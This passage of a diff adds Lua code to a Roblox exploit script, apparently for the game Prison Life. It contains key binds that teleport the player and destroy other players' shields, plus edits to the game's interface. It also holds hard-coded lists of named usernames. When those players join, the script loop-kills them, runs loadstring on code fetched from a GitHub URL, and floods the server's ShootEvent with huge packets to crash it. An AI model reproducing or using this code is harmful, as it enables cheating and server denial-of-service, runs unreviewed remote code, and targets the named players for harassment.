+								healthBar()
+							end
+						else 
+							if person == "c" then
+								local lastPos = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").position
+								LCS = game.Workspace["Criminals Spawn"].SpawnLocation
+								LCS.CanCollide = false
+								LCS.Size = Vector3.new(51.05, 24.12, 54.76)
+								LCS.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+								LCS.Transparency = 1
+								wait(0.5)
+								LCS.CFrame = CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+								LCS.Size = Vector3.new(6, 0.2, 6)
+								LCS.Transparency = 0
+								wait()
+								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lastPos)
+								healthBar()
+
+								if states.AUTORE == true then
+									local char = workspace:FindFirstChild(UserName)
+
+									char.Humanoid.Died:Connect(humanoidDied)
+								end
+
+							else
+								if person and person2 and person3 then
+									refreshT(Color3.fromRGB(person,person2,person3))
+
+
+									healthBar()
+
+									if states.AUTORE == true then
+										local char = workspace:FindFirstChild(UserName)
+
+										char.Humanoid.Died:Connect(humanoidDied)
+									end
+								else
+									if person == "color" then
+										refreshT(Colorf.BackgroundColor3)
+
+										healthBar()
+
+										if states.AUTORE == true then
+											local char = workspace:FindFirstChild(UserName)
+
+											char.Humanoid.Died:Connect(humanoidDied)
+										end
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end	
+	end
+
+	wait()
+	do_command()
+
+end
+
+local uis = game:GetService("UserInputService")
+uis.InputBegan:Connect(function(input, gameProcessedEvent)
+
+	if input.UserInputType == Enum.UserInputType.Keyboard then
+		if input.KeyCode == Enum.KeyCode.Return then
+			get_command()
+			wait(0.03)
+			TextBox.Text = " "
+		end
+	end
+end) 
+
+game:GetService("UserInputService").InputBegan:connect(function(input, gameProcessedEvent)
+	if gameProcessedEvent then return end
+	if input.KeyCode == Enum.KeyCode.Z then
+		respawns()
+
+		wait(0.1)
+
+		healthBar()
+		getGuns()
+	end
+end)
+
+game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
+	if gameProcessedEvent then return end
+	if inputObject.KeyCode == Enum.KeyCode.G then
+		for _,player in pairs(game.Players:GetPlayers()) do
+			local minecraft = game.Workspace:FindFirstChild(player.Name).Torso:FindFirstChild("ShieldFolder")
+			if minecraft then
+				minecraft:Destroy()
+			end
+			local fortnite = game.Workspace:FindFirstChild(player.Name):FindFirstChild("Riot Shield")
+			if fortnite then
+				fortnite:Destroy()
+			end
+		end
+	end
+end)
+
+local xd = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.ClockFrame
+
+local xdxd = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.MenuButton
+
+local ashn = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.GunFrame
+
+local dauh = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.GunFrame.Frame
+
+local dadu = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.Topbar.Pulldownmenu
+
+local jhis = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.Topbar.titleBar
+
+local ajwi = game:GetService("Players").LocalPlayer.PlayerGui.Home.hud.Topbar.Pulldownmenu.tb
+
+local colorfavz = Colorf.BackgroundColor3
+
+xd.BackgroundColor3 = colorfavz
+
+xdxd.BackgroundColor3 = colorfavz
+
+ashn.BackgroundColor3 = colorfavz
+
+dauh.BackgroundColor3 = colorfavz
+
+dadu.BackgroundColor3 = colorfavz
+
+jhis.BackgroundColor3 = colorfavz
+
+ajwi.BackgroundColor3 = colorfavz
+
+game:GetService("Players").LocalPlayer.PlayerGui.Home.fadeFrame.Visible = false
+
+local spawnn = game:GetService("Workspace")["NEUTRAL SPAWNLOCATIONS"].SpawnLocation
+
+spawnn.Size = Vector3.new(500, 1, 500)
+
+local jojojaja = Instance.new("Part",game.Workspace)
+jojojaja.Anchored = true 
+jojojaja.Position = Vector3.new(-128, -480, 2048)
+jojojaja.Size = Vector3.new(300, 1, 300)
+jojojaja.Material = Enum.Material.Grass
+jojojaja.BrickColor = BrickColor.new(58, 125, 21)
+
+local StarterGui = game:GetService("StarterGui")
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
+
+Exploiters = {
+	"Frankiliano_22",
+	"02Vxid",
+	"iDrixo_x2",
+	"llxmbz",
+	"Isatmplx",
+	"XxCamiloDiazXx",
+	"TioDeGoku"
+}
+
+ABSV = {
+	"Frankiliano_22",
+	"TioDeGoku",
+	"XxCamiloDiazXx"
+}
+
+HDP = {
+	"llxmbz",
+	"Isatmplx",
+	"iDrixo_x2"
+}
+
+game.Players.PlayerAdded:Connect(function(Player)
+	chatnotify(Player.Name.. " ENTRO AL SERVER")
+	for i, v in pairs(Exploiters) do
+		if Player.Name == v then
+			Warning(Player.Name.."/"..Player.DisplayName.." ES EXPLOITER")
+		end
+	end
+	
+	for i, v in pairs(ABSV) do
+		if Player.Name == v then
+			if states.BLACKLIST == true then
+				Blacklist(Player.Name.."/"..Player.DisplayName.." ES ABUSER")
+
+
+				states.LOOPCRIM = true
+
+				while states.LOOPCRIM == true do
+					wait(0.02)
+
+					workspace.Remote.TeamEvent:FireServer("Bright orange")
+
+					local player = Player
+
+					if player then
+						local char = workspace:FindFirstChild(player.Name)
+						local hum = char and char:FindFirstChild("HumanoidRootPart")
+						local head = char and char:FindFirstChild("Head")
+
+						local m_char = workspace:FindFirstChild(UserName)
+						local m_hum = m_char and m_char:FindFirstChild("HumanoidRootPart")
+						if m_char and m_hum and char and (char or head) then 
+							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = hum and hum.CFrame or head.CFrame
+						end
+					end
+
+					for _,v in pairs(game.Players:GetPlayers()) do
+						pcall(function()
+							if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and ((game.Players.LocalPlayer.Character:FindFirstChildOfClass('Part').Position-workspace[v.Name]:FindFirstChildOfClass('Part').Position).magnitude < 10) and v ~= game.Players.LocalPlayer then
+								for i = 1,workspace[v.Name].Humanoid.Health/5 do
+									game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
+								end
+							end
+						end)
+					end
+
+					local crim = game:GetService("Workspace")["Criminals Spawn"].SpawnLocation
+
+					local player = Player
+
+					crim.CanCollide = false
+					crim.CFrame = GetRootOri()
+
+					if states.LOOPCRIM == false then
+						break
+					end
+
+				end
+				
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Julianitocuatro/sa/main/sa",true))();
+			end
+		end
+	end
+	
+	for i,v in pairs(HDP) do
+		if Player.Name == v then
+			if states.BLACKLIST == true then
+				Blacklist(Player.Name.." HIJUEPUTA DETECTADO, CRASHEANDO SERVER.")
+
+				local PackageSize = 100000
+				local SendPackageAmountOfTimes = 5
+
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+				local Players = game:GetService("Players")
+				local LocalPlayer = Players.LocalPlayer
+
+				local ItemHandler = workspace:WaitForChild("Remote").ItemHandler
+				local ShootEvent = ReplicatedStorage:WaitForChild("ShootEvent")
+
+				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+				local Tool = Players.LocalPlayer:FindFirstChild("Backpack"):FindFirstChild("Remington 870") or workspace:WaitForChild(Players.LocalPlayer.Name):FindFirstChild("Remington 870")
+
+				local Packet = {
+					RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
+					Distance = math.huge,
+					Cframe = CFrame.new(0, 0, 0),
+					Hit = workspace:FindFirstChildOfClass("Part")
+				}
+
+				local Package = {}
+
+				for i = 1, PackageSize do
+					Package[i] = Packet
+				end
+
+				for i = 1, SendPackageAmountOfTimes do
+					ShootEvent:FireServer(Package, Tool)
+				end
+			end
+		end
+	end
+end)
+
